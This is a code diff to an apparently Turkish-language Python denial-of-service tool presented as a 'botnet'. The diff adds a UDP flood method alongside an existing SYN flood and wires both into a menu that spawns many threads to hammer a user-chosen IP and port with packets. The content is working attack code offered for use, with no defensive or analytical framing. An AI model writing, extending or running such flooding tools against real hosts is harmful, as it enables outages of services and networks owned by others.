@@ -30,6 +30,16 @@ class Bot:
                 print(Fore.RED + f"  Hata Oluştu: {e}\n")
                 break
 
+    def udp_flood_attack(self):
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.sendto(b'XChoice', (self.target_ip, self.target_port))
+                self.attack_queue.put(1)
+            except Exception as e:
+                print(Fore.RED + f"  Hata Oluştu: {e}\n")
+                break
+
 def visualize_attack_status(attack_queue, max_attack):
     attack_counter = 0
     while attack_counter < max_attack:
@@ -39,25 +49,32 @@ def visualize_attack_status(attack_queue, max_attack):
             print(Fore.CYAN + f"  Saldırı Devam Ediyor: {attack_counter}/{max_attack} paket gönderildi\n")
         except queue.Empty:
             break
-    print(Fore.GREEN + "  Saldırı tamamlandı. Ana menüye dönülüyor...")
+    print(Fore.GREEN + "  Saldırı tamamlandı. Ana menüye dönülüyor...\n")
+    time.sleep(2)
     main_menu()
 
-def create_botnet(target_ip, target_port, bot_count, max_attack):
+def create_botnet(target_ip, target_port, bot_count, max_attack, attack_type):
     attack_queue = queue.Queue()
     bots = []
+    attack_function = None
+
+    if attack_type == "s":
+        attack_function = Bot(target_ip, target_port, attack_queue).syn_flood_attack
+    elif attack_type == "u":
+        attack_function = Bot(target_ip, target_port, attack_queue).udp_flood_attack
+
     for i in range(bot_count):
-        bot = Bot(target_ip, target_port, attack_queue)
-        bot_thread = threading.Thread(target=bot.syn_flood_attack)
+        bot_thread = threading.Thread(target=attack_function, args=())
         bot_thread.daemon = True
         bot_thread.start()
-        bots.append(bot)
-    
+        bots.append(bot_thread)
+
     threading.Thread(target=visualize_attack_status, args=(attack_queue, max_attack)).start()
 
 def slow_print(text):
     for char in text:
         print(char, end='', flush=True)
-        time.sleep(0.014)
+        time.sleep(0.012)
     print()
 
 def figlet():
@@ -97,6 +114,7 @@ def print_local_ip_addresses():
             print(Fore.YELLOW + f"  {ip}\n")
     else:
         print(Fore.RED + "  Yerel IP adresi bulunamadı.")
+    main_menu()
 
 def get_ip_from_url(url):
     try:
@@ -106,7 +124,8 @@ def get_ip_from_url(url):
         else:
             raise ValueError("Geçersiz URL")
     except Exception as e:
-        print(Fore.RED + f"  Hata: {e}")
+        print(Fore.RED + f"  Hata: {e}\n")
+        main_menu()
     return None
 
 def print_external_ip_address():
@@ -114,6 +133,7 @@ def print_external_ip_address():
     ip_address = get_ip_from_url(input_url)
     if ip_address:
         print(Fore.CYAN + f"  Site IP Adresi: {ip_address}\n")
+        main_menu()
 
 def is_valid_ip(ip):
     try:
@@ -172,21 +192,30 @@ def attack_menu():
     target_ip = get_valid_ip()
     target_port = get_valid_port()
     bot_count = int(input(Fore.GREEN + "  Bot Sayısını Girin: "))
-    max_attack = int(input(Fore.GREEN + "  Saldırı Kaç Paket Gönderildiğinde Durdurulsun: "))
+    max_attack = int(input(Fore.GREEN + "Kaç Paket Gönderildiğinde Durdurulsun: "))
+    attack_type = input(Fore.GREEN + "  Saldırı Türünü Seçin ([s] SYN [u] UDP): ")
 
     print(Fore.CYAN + "  Botnet Saldırısı Başlatılıyor...")
     print(Fore.CYAN + f"  Hedef IP: {target_ip}")
     print(Fore.CYAN + f"  Hedef Port: {target_port}")
     print(Fore.CYAN + f"  Bot Sayısı: {bot_count}")
-    print(Fore.CYAN + f"  Saldırı Kaç Paket Gönderildiğinde Durdurulsun: {max_attack}")
+    print(Fore.CYAN + f"  Kaç Paket Gönderildiğinde Durdurulsun: {max_attack}")
 
     attack_ongoing = True
-    create_botnet(target_ip, target_port, bot_count, max_attack)
+
+    if attack_type == "s":
+        create_botnet(target_ip, target_port, bot_count, max_attack, attack_type)
+    elif attack_type == "u":
+        create_botnet(target_ip, target_port, bot_count, max_attack, attack_type)
+    else:
+        print(Fore.RED + "  Geçersiz seçim! Lütfen 's' veya 'u' girin.")
+        return
 
     while attack_ongoing and (max_attack is None or attack_counter < max_attack):
         pass
-    
 
+
+    attack_ongoing = False
 
 def main_menu():
     global attack_ongoing
@@ -230,7 +259,7 @@ def main_menu():
             sys.exit()
         else:
             print(Fore.RED + "  GEÇERSİZ SEÇİM!")
-        
+
         if not attack_ongoing:
             break
 
@@ -241,5 +270,3 @@ if __name__ == "__main__":
     print_warning()
     figlet()
     main_menu()
-    
-    
